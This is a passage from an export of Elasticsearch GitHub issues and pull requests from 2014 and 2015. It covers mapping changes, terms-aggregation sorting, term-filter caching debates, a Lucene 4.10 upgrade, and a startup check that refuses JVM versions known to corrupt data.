</description><key id="41929783">7590</key><summary>Deduplicate useful headers that get copied from REST to transport layer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T12:26:38Z</created><updated>2015-06-07T12:06:38Z</updated><resolved>2014-09-04T13:08:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-04T12:59:49Z" id="54470662">LGTM
</comment><comment author="uboness" created="2014-09-04T13:02:22Z" id="54471118">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping: Return `_boost` and `_analyzer` in the GET field mapping API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7589</link><project id="" key="" /><description>...so

_boost and _analyzer mapping can now be retrieved by their default name
or by given name ("path" for _analyzer, "name" for _boost)
Both still appear with their default name when just retrieving the mapping.
(see SimpleGetFieldMappingTests#testGet_boostAnd_analyzer and
     SimpleGetMappingTests#testGet_boostAnd_analyzer)

The index_name handling is removed from _boost. This never worked anyway,
see this test: https://github.com/brwe/elasticsearch/commit/36450043640f49f959d953dfd546f33606cb953a

Change in behavior:

_analyzer was never a field mapper. When defining an analyzer
in a document, the field (_analyzer or custom name) was indexed
with default string field properties. These could be overwritten by
defining an explicit mapping for this field, for example:

```
PUT testidx/doc/_mapping
{
  "_analyzer": {
    "path": "custom_analyzer"
  },
  "properties": {
    "custom_analyzer": {
      "type": "string",
      "store": true
    }
  }
}
```

Now, this explicit mapping will be ignored completely, instead
one can only set the "index" option in the definition of _analyzer
Every other option will be ignored.

Reason for this change:
The documentation says

"By default, the _analyzer field is indexed, it can be disabled by settings index to no in the mapping."

This was not true - the setting was ignored. There was a test
for the explicit definition of the mapping (AnalyzerMapperTests#testAnalyzerMappingExplicit)
but this functionallity was never documented so I assume it is not in use.

closes #7237

Things that worry me:

I made it work, but am unsure if this is too hacky. I just made use of the fact that four different names are used for mappers (name, indexName, indexNameClean and full name) and set the name at the fitting place. However, there is plans for deprecating indexName (#6677) so I am unsure how long this solution will have any worth. 

In addition the overwriting of the properties mapping relies on the fact that the order in which mappings are parsed is never changed. 

Also, I wonder if the change in behavior for _analyzer qualifies as "breaking change".
</description><key id="41929453">7589</key><summary>Mapping: Return `_boost` and `_analyzer` in the GET field mapping API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels><label>enhancement</label><label>won't fix</label></labels><created>2014-09-04T12:22:57Z</created><updated>2015-02-25T17:19:34Z</updated><resolved>2015-02-20T11:50:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-09-05T12:36:37Z" id="54619304">Better wait with the reviews. I think this needs a little more work.
</comment><comment author="brwe" created="2014-09-05T13:35:57Z" id="54625272">removed some unneeded code, should be ok now.
</comment><comment author="rjernst" created="2014-09-15T16:18:12Z" id="55615116">Why do we have `_analyzer` at all? This seems very strange that a document could define which analyzer it will use, since this could introduce discrepancies between what is indexed and what is queried?  Can we just get rid of `_analyzer`? Or deprecate (and change the documentation that to indicate that it is always indexed), and remove in master?
</comment><comment author="clintongormley" created="2014-09-24T18:48:56Z" id="56719393">@rjernst i agree, i definitely want to deprecate it.  but this PR is just about making the existing functionality consistent.
</comment><comment author="rjernst" created="2014-09-24T19:46:21Z" id="56727414">But this is technically adding new functionality (which was previously documented, but unimplemented).  Could we instead:
1. Remove _analyzer from master
2. Update documentation for 1.x to say:
- _analyzer is always indexed
- It is deprecated, will be removed in 2.0, and you should not use it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Adds ability to sort on multiple criteria</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7588</link><project id="" key="" /><description>The terms aggregation can now support sorting on multiple criteria by replacing the sort object with an array or sort object whose order signifies the priority of the sort. The existing syntax for sorting on a single criteria also still works.

Contributes to #6917
</description><key id="41924662">7588</key><summary>Aggregations: Adds ability to sort on multiple criteria</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>enhancement</label></labels><created>2014-09-04T11:26:23Z</created><updated>2014-09-09T14:59:51Z</updated><resolved>2014-09-08T14:21:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-05T07:58:24Z" id="54595609">@jpountz  Didn't realise that you hadn't removed the review tag but have just pushed an update from your feedback. Sorry if that messes things up
</comment><comment author="jpountz" created="2014-09-05T15:09:15Z" id="54637395">LGTM
</comment><comment author="colings86" created="2014-09-08T19:35:37Z" id="54874737">These changes have been reverted as backward compatibility issues were found. A new PR will be raised when the issues have been resolved
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>remove eclipse auto-organize-imports</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7587</link><project id="" key="" /><description>This causes me problems at times, the automation screws with formatting, just like refactoring tools, especially if the file has strange indentation or other formatting to begin with. 

It also drags in wildcard imports, which can cause bugs (for example I've seen project bugs wildcarding in Base64 and then they won't compile with java8 because of the new class).

Finally, I think its just too much magic?
</description><key id="41914914">7587</key><summary>remove eclipse auto-organize-imports</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels /><created>2014-09-04T09:38:20Z</created><updated>2014-10-20T10:26:42Z</updated><resolved>2014-10-20T10:26:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-04T10:11:56Z" id="54446111">I think there are two issues here:
- the import format
- whether to auto-organize

The reason why I changed the format of imports was to match intellij's default behavior (since most of the code base has been written with it). Otherwise, files that I checked in would be completely reformatted on the next time that an intellij user would modify it, which makes reviews painful.

I am +1 on changing it to disallow wildcards. Although not a requirement, it would be nice to do it on the intellij config too to avoid the back and forth in the way that imports are organized.

Regarding auto-organize, I added it because Eclipse would otherwise fail at inserting imports at the right position but we can disable it if it is inconvenient to you.
</comment><comment author="rmuir" created="2014-09-04T10:17:52Z" id="54446995">I think the auto-organize is the bigger evil. It seems like bugs in eclipse, i'm not sure. But i always have this problem when code refactoring if the file has some style issues, e.g. even if its 'add missing `@Override`', and have to come back and correct it. Usually its ok when manually refactoring, because I'm specifically looking out for it. Maybe eclipse 4.x doesnt have the issue... I know I'm still stuck on 3.x because i need the speed...
</comment><comment author="rjernst" created="2014-09-05T06:46:09Z" id="54590714">+1 on removing wildcard imports for both eclipse and intellij.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Checksum state files written to disk</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7586</link><project id="" key="" /><description>We write a number of state files to disk, including persistent cluster settings, the state of indices and so forth. In order to detect disk corruption in these files we should also write the checksum of these files to disk. On read we can verify the integrity of these files if a checksum file is present.
</description><key id="41914083">7586</key><summary>Checksum state files written to disk</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">dakrone</reporter><labels><label>enhancement</label><label>resiliency</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T09:29:36Z</created><updated>2014-10-15T09:35:57Z</updated><resolved>2014-10-15T09:35:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Return number of buckets for terms aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7585</link><project id="" key="" /><description>In terms aggregation we can limit the number of buckets using the size parameter but then we are not sure how much buckets exist.
Or we will need to do a separate count aggregation to find this.
Kindly return the total number of distinct terms in the response.
</description><key id="41888970">7585</key><summary>Return number of buckets for terms aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels /><created>2014-09-04T02:36:08Z</created><updated>2015-09-17T21:07:58Z</updated><resolved>2014-09-06T16:44:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:44:42Z" id="54720063">Hi @Vineeth-Mohan 

Each aggregation is intended to be "minimal".  If you want to know how many distinct values there are, you can add a `value_count` aggregation:

```
GET /_search
{
  "aggs": {
    "top_terms": {
      "terms": {
        "field": "foo"
      }
    },
    "total_terms": {
      "value_count": {
        "field": "foo"
      }
    }
  }
}
```

See http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-metrics-valuecount-aggregation.html#search-aggregations-metrics-valuecount-aggregation
</comment><comment author="dsernst" created="2015-09-17T21:07:29Z" id="141228660">@clintongormley: For distinct values, I believe you'd need to use a [`cardinality`](https://www.elastic.co/guide/en/elasticsearch/reference/1.7/search-aggregations-metrics-cardinality-aggregation.html) aggregation, not `value_count`:

```
GET /_search
{
  "aggs": {
    "top_terms": {
      "terms": {
        "field": "foo"
      }
    },
    "distinct_terms": {
      "cardinality": {
        "field": "foo"
      }
    }
  }
}
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Lucene 4.10</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7584</link><project id="" key="" /><description /><key id="41888036">7584</key><summary>Upgrade to Lucene 4.10</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>:Core</label><label>release highlight</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T02:12:21Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-09-05T16:25:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-04T08:55:46Z" id="54434378">LGTM
</comment><comment author="kimchy" created="2014-09-04T12:15:56Z" id="54463843">left some comments
</comment><comment author="s1monw" created="2014-09-04T13:39:52Z" id="54477970">LGTM
</comment><comment author="rjernst" created="2014-09-04T16:52:26Z" id="54508912">I made the merge policy changes, but I have not added a test.  There are no existing tests, but there really should be one for each provider checking that the settings can actually be set, and updated.   I'll work on these separately, though, unless someone feels it is important to block the upgrade on adding these tests.
</comment><comment author="s1monw" created="2014-09-04T17:59:12Z" id="54518512">looks good
</comment><comment author="kimchy" created="2014-09-04T18:09:38Z" id="54520083">@rjernst what about the NamedAnalyzer? I think it should use the same strategy as the analyzer it wraps, no?
</comment><comment author="rmuir" created="2014-09-04T18:25:33Z" id="54522433">I am sure I made the NamedAnalyzer commit. I just followed Uwe's approach for PerFieldAnalyzerWrapper: this strategy is in fact not used, except as a fallback in the case you wrap namedanalyzer in yet another wrapper (such as shingles) that isnt a pure delegator.

So its just "safety", but maybe there is a way we could just have an error if we do such a thing instead of increased memory usage? Personally I still would prefer if delegation and wrapping use-cases were totally separate and type-safe, but my head is still recovering from looking at this stuff the last time.
</comment><comment author="kimchy" created="2014-09-04T18:27:39Z" id="54522747">@rmuir yea, I think that in practice, it doesn't matter in the context of NamedAnalyzer, since its just a wrapper. I just think in practice, its cleaner, since NamedAnalyzer is just a delegate, and thats it, not similar to PerfieldAanalyzerWrapper, because of it, I think its cleaner (in the scope of just the NamedAnalyzer impl) to use the same reuse strategy as the analyzer it wraps.
</comment><comment author="rmuir" created="2014-09-04T18:32:19Z" id="54523436">Right i think the potential for a bug only happens if:
1. NamedAnalyzer wraps something that is per-field (e.g. a PerFieldAnalyzerWrapper)
2. this NamedAnalyzer is wrapped by something that modifies the chain (e.g. shingles or adds charfilter or whatever)

The confusing thing is the API for this "strategy" its passing, again if elasticsearch isn't doing crazy things (and i think its not), then this strategy is never really used:

```
 /**
  * Constructor.
  * @param fallbackStrategy is the strategy to use if delegation is not possible
  *  This is to support the common pattern:
  *  {@code new OtherWrapper(thisWrapper.getReuseStrategy())} 
  */
 protected DelegatingAnalyzerWrapper(ReuseStrategy fallbackStrategy) {
```

I guess my suggestion is whether we should force an error in such a "fallback" case, one evil way is to pass ThrowsExceptionOnEveryOperationReuseStrategy instead. There might be cleaner ways.
</comment><comment author="kimchy" created="2014-09-04T18:33:39Z" id="54523646">I am up for `ThrowsExceptionOnEveryOperationReuseStrategy`, I think that if we get into a case where we don't fallback, it smells like a bug in ES
</comment><comment author="rmuir" created="2014-09-04T18:35:34Z" id="54523971">I think those are the 3 choices we have today (since unfortunately we dont have great type safety):
1. if we screw up, its safe but will chew up threadlocals (slower). thats what branch does.
2. if we screw up, its buggy. thats what passing the wrapped strategy does.
3. if we screw up, we get an error and tests fail.

Personally I am for option 3 as well. I will try to think of a cleaner way.
</comment><comment author="rmuir" created="2014-09-05T13:06:21Z" id="54622066">What is left to do here?
</comment><comment author="kimchy" created="2014-09-05T16:06:14Z" id="54645293">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Core: Do not cache term filters by default.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7583</link><project id="" key="" /><description>These filters are directly based on postings lists and can already
iterate/advance quickly. It is still possible to opt-in for caching.
</description><key id="41885505">7583</key><summary>Core: Do not cache term filters by default.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels /><created>2014-09-04T01:17:15Z</created><updated>2015-01-08T09:09:24Z</updated><resolved>2014-11-12T11:15:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-05T06:42:29Z" id="54590490">LGTM.
</comment><comment author="s1monw" created="2014-09-05T20:21:26Z" id="54676372">LGTM too :) good one
</comment><comment author="clintongormley" created="2014-09-07T07:42:24Z" id="54739916">This change concerns me a bit, based on the numbers in https://github.com/elasticsearch/elasticsearch/pull/7577#issuecomment-54551472

A lot of the time, we use term filters on dense values like:
-  `_type: "event"`
-  `status: "active"`
-  `gender: "male"`
-  `user: "customer_1"` (think filtered aliases)

These common use cases are all dense and often combined in the same filter. According to the benchmarks, each of them would be 50% slower than they are today.

The other concern I have is that caching term filters allows us to completely skip segments that don't contain that term.  Without that caching, we're going to have to do a term lookup on potentially thousands of segments which we would previously have skipped. What impact does that have on performance?

The numbers shown in https://github.com/elasticsearch/elasticsearch/pull/7577#issuecomment-54551472 for Leapfrog look promising, but the bool filter won't do that today so users will experience a drop in performance out of the box.

This change (and #7577) seem like they could be very useful in the longer term, but they require more (as yet unwritten) supporting changes to provide a net out-of-the-box benefit.  I'd vote for not putting them into 1.4 but delaying them until we can implement a more complete solution.

(Apologies if I have misunderstood the impact of these changes)
</comment><comment author="jpountz" created="2014-10-02T10:18:29Z" id="57609185">@clintongormley Your analysis is correct but I think it underestimates the cost of caching:
1. unnecessary garbage
2. the iterator needs to be fully consumed
1. is due to the fact that we need to load things into memory and put it in a cache. The fact that it goes to a cache makes it very likely to end up in the old generation. For that reason, I think we should generally not cache filters maybe unless we already have something that is cacheable (eg. terms filter) or we know the filter is going to be reused.
2. is bound to the fact that our postings lists have good skip lists. Imagine a user who would use term filters that are never reused. If they are cached, elasticsearch would need to iterate over all documents that match the filter and put them into a bit set, and then use that bit set to intersect the query. On the contrary if the filter is not cached, the postings list would be directly intersected with the query and thanks to the leap-frog approach, very few documents could be consumed from the postings list (it would just jump efficiently over non-matching docs using the skip list). This makes non-cached filters potentially much faster when there is not enough reuse.

I agree that #7577 needs more work in order to be better in all cases and not only the sparse case, but I think this change is good? Maybe something that needs to be improved is the default value of the `cache` parameter. For example, I believe it would not be too hard to have caching disabled by default in general unless it applies to the `_type` field or if we are in the context of an alias filter (the latter would probably also apply to other filters that we don't cache today by default?).
</comment><comment author="dakrone" created="2014-10-02T10:58:41Z" id="57612316">I think it might also be useful to cache term filters used in aliases, since creating an alias with a term filter has a high chance of being re-used (for future work, just an idea).
</comment><comment author="jpountz" created="2014-11-12T11:15:44Z" id="62703617">We just had a discussion about this issue and could not reach to an agreement about what the best default `_cache` value is for `term` filters.

A better solution could be to make the decision based on usage as outlined in #8449.
</comment><comment author="bobrik" created="2015-01-08T08:31:53Z" id="69149760">http://www.elasticsearch.org/blog/2015-01-07-this-week-in-elasticsearch/ I thought that this is merged.
</comment><comment author="jpountz" created="2015-01-08T09:04:47Z" id="69152743">Oops, that's probably because I forgot to remove the labels when closing. Thanks for the report, I'll try to get it removed from the blog post as well.
</comment><comment author="jpountz" created="2015-01-08T09:09:24Z" id="69153215">OK I just removed it.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove DocSetCache.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7582</link><project id="" key="" /><description>This class was unused.
</description><key id="41884751">7582</key><summary>Remove DocSetCache.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Internal</label><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T01:02:19Z</created><updated>2015-06-08T14:31:42Z</updated><resolved>2014-09-04T09:09:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-04T06:47:31Z" id="54416453">LGTM nice stats :)
</comment><comment author="jpountz" created="2014-09-04T09:11:11Z" id="54436835">Pushed to master. I didn't push to 1.x since it is used by facets when `mode=post`.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Use FixedBitSetFilterCache for delete-by-query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7581</link><project id="" key="" /><description>Leftover from #7037.
</description><key id="41883975">7581</key><summary>Use FixedBitSetFilterCache for delete-by-query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Search</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T00:45:50Z</created><updated>2015-06-07T12:07:13Z</updated><resolved>2014-09-11T07:48:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T20:19:58Z" id="54676202">LGTM
</comment><comment author="martijnvg" created="2014-09-07T12:40:09Z" id="54745553">LGTM
</comment><comment author="s1monw" created="2014-09-10T07:48:58Z" id="55081915">@jpountz can we push this?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Resiliency: Throw exception if the JVM will corrupt data.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7580</link><project id="" key="" /><description>Detect the worst-offender, known hotspot versions that can
cause index corruption, and fail on startup.
</description><key id="41883423">7580</key><summary>Resiliency: Throw exception if the JVM will corrupt data.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>:Core</label><label>breaking</label><label>resiliency</label><label>v1.4.5</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T00:34:40Z</created><updated>2015-04-11T16:49:05Z</updated><resolved>2015-03-21T06:50:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-04T06:46:22Z" id="54416316">I left two comments - looks good in general
</comment><comment author="spinscale" created="2014-09-04T07:47:00Z" id="54424136">"Please upgrade" is the last message the user gets in the exception, without having any clue where to upgrade to and which other versions are affected (maybe even the latest one is).

Can we point the user somewhere, where he gets help instead of being unspecific here? A documentation page which contains unsafe versions we could link to or something?
</comment><comment author="dadoonet" created="2014-09-04T08:42:54Z" id="54432844">+1 for @spinscale comment. I really like when projects log errors with links to documentation. 
</comment><comment author="rmuir" created="2014-09-04T09:32:01Z" id="54440168">Who will make and maintain such a page and ensure it doesnt go 404?
</comment><comment author="clintongormley" created="2014-09-04T09:40:58Z" id="54441640">@rmuir the docs build process checks all links within the docs before pushing any changes live. it also has hooks for custom checks, eg we also check the links in the config.yml file to ensure that they are still correct.  We could add a custom hook for this page too.
</comment><comment author="rmuir" created="2014-09-04T09:44:31Z" id="54442226">I'm not really a webpage designer. I think this is blowing up the scope of the issue with unnecessary requirements.
</comment><comment author="dadoonet" created="2014-09-04T09:46:33Z" id="54442563">I think we should think of something somehow generic. Such as what Twitter4J does.
For each error you get, you have an associated Error code which is unique.

The log says:

```
Relevant discussions can be found on the Internet at:
    http://www.google.co.jp/search?q=93f2523c or
    http://www.google.co.jp/search?q=8b74a4e3
TwitterException{exceptionCode=[93f2523c-8b74a4e3], statusCode=401, message=Invalid or expired token, code=89, retryAfter=-1, rateLimitStatus=null, version=3.0.3}
```

I think we should think about something similar but in another issue as we somehow hijacked this one :)
</comment><comment author="clintongormley" created="2014-09-04T09:47:06Z" id="54442657">Well, we need to document good versions anyway.  It doesn't require any design, just a page of docs.  This is versioned along with the code.  You tell me what info needs to be on the page and I'll write it.
</comment><comment author="rmuir" created="2014-09-04T09:48:44Z" id="54442934">Crashing with an empty SIGSEGV is better than today. It prevents data corruption. We don't even need an error message at all, a webpage is over the top. Its stupid to block this issue on such things.
</comment><comment author="clintongormley" created="2014-09-04T12:37:46Z" id="54467450">Rather than adding a link to the error message, which may well change in the future, let's just add "Please see the documentation" to the error message.  Searching for "java version" or "jvm version" will bring up the docs section added in https://github.com/elasticsearch/elasticsearch/pull/7591
</comment><comment author="nik9000" created="2014-09-04T13:06:11Z" id="54471740">@clintongormley watch out for how personalized google can be - that probably would work for you or me but it might not work for someone who's searched for elasticsearch fewer times.  Besides, if you move the page it _should_ get a redirect.  Or you could go all out and point to a version on the internet archive or something....
</comment><comment author="clintongormley" created="2014-09-04T13:29:44Z" id="54476289">@nik9000 i meant the search in the ES docs :)

won't work now, but will when #7591 is merged
</comment><comment author="nik9000" created="2014-09-04T13:43:42Z" id="54478532">&gt; @nik9000 i meant the search in the ES docs :)

Ah!  Cool.  Can you link to a page that searches the Elasticsearch docs?  Something like [this](http://www.elasticsearch.org/guide/?s=java version)?
</comment><comment author="s1monw" created="2014-09-05T20:19:17Z" id="54676126">@rmuir I left some comments - I think it's close though!
</comment><comment author="s1monw" created="2014-09-10T07:44:58Z" id="55081585">@rmuir can we move forward here it is marked as a blocker an I'd really like to move forward here
</comment><comment author="rmuir" created="2014-09-10T17:08:19Z" id="55147890">I don't think the change will make it in. Please understand my point of view:

I didn't just take a few minutes and whip up a quick patch here, i tested extensively with all impacted hotspot versions (both Oracle JDK and openjdk/IcedTea), including testing the workaround bypass, and testing that "good versions" are ok, etc. This took me a good bit of time.

This is an exceptionally dangerous piece of functionality. With all the scope creep of this issue ("extra features" and "nice to haves" etc), comes the need to retest. There is no way I would touch this logic in a functional way, such as renaming parameters, without retesting. 

So we should decide what is really a priority, and what can be a followup issue.

Currently I am fighting other fires, and I just dont have enough time to do it right, sorry.
</comment><comment author="s1monw" created="2014-09-11T07:15:23Z" id="55228328">moved out to 1.5 
</comment><comment author="s1monw" created="2015-03-20T21:49:54Z" id="84162652">@rmuir @rjernst should we revisit this or should I just close it for now?
</comment><comment author="s1monw" created="2015-03-20T22:04:08Z" id="84166209">I really think we should use what we have and expand in other issues. This PR is a good improvement and it's been sitting here for way too long. @rmuir can you rebase this branch and add maybe missing JVMs? all the other requests can be added later. 
</comment><comment author="rjernst" created="2015-03-20T22:05:58Z" id="84166433">+1 to get this in as is.
</comment><comment author="rmuir" created="2015-03-21T06:14:27Z" id="84264555">I updated the check since i had to re-test all JVMs anyway.

I refactored this out of bootstrap, made messaging more verbose, added support for compiler workaround flags, and added logic for IBM (because users have hit this on the mailing list).

Example output with different versions:

1.7.0:

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar org.elasticsearch.bootstrap.JVMCheck

Exception in thread "main" java.lang.RuntimeException: Java version: 1.7.0 suffers from critical bug https://bugs.openjdk.java.net/browse/JDK-7070134 which can cause data corruption.
Please upgrade the JVM, see http://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html for current recommendations.
If you absolutely cannot upgrade, please add -XX:-UseLoopPredicate to the JVM_OPTS environment variable.

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar -XX:-UseLoopPredicate org.elasticsearch.bootstrap.JVMCheck

Mar 21, 2015 1:48:58 AM org.elasticsearch.bootstrap.JVMCheck check
WARNING: Workaround flag -XX:-UseLoopPredicate for bug https://bugs.openjdk.java.net/browse/JDK-7070134 found. 
This will result in degraded performance!
Upgrading is preferred, see http://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html for current recommendations.

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar -Des.bypass.vm.check=true org.elasticsearch.bootstrap.JVMCheck

Mar 21, 2015 1:59:57 AM org.elasticsearch.bootstrap.JVMCheck check
WARNING: bypassing jvm version check for version [1.7.0], this can result in data corruption!

1.7.0_40:

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar org.elasticsearch.bootstrap.JVMCheck

Exception in thread "main" java.lang.RuntimeException: Java version: 1.7.0_40 suffers from critical bug https://bugs.openjdk.java.net/browse/JDK-8024830 which can cause data corruption.
Please upgrade the JVM, see http://www.elastic.co/guide/en/elasticsearch/reference/current/_installation.html for current recommendations.
If you absolutely cannot upgrade, please add -XX:-UseSuperWord to the JVM_OPTS environment variable.
Upgrading is preferred, this workaround will result in degraded performance.

$ java -cp elasticsearch-2.0.0-SNAPSHOT.jar:lib/lucene-core-5.1.0-snapshot-1662607.jar -XX:-UseSuperWord org.elasticsearch.bootstrap.JVMCheck

Mar 21, 2015 1:51:03 AM org.elasticsearch.bootstrap.JVMCheck check
